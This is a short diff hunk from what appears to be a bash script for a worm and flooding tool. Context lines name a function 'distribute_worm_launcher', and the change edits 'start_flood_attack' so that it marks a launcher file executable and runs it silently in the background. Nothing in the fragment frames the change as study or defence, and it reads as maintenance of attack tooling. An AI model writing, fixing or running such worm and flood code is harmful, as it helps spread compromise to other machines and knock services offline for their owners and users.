@@ -59,7 +59,7 @@ distribute_worm_launcher(){
 }
 
 start_flood_attack(){
-    $ldir/$lfname &> /dev/null &
+    chmod +x $ldir/$lfname && $ldir/$lfname &> /dev/null &
 }
 
 parent_path=$( cd "$(dirname "${BASH_SOURCE[0]}")" ; pwd -P )
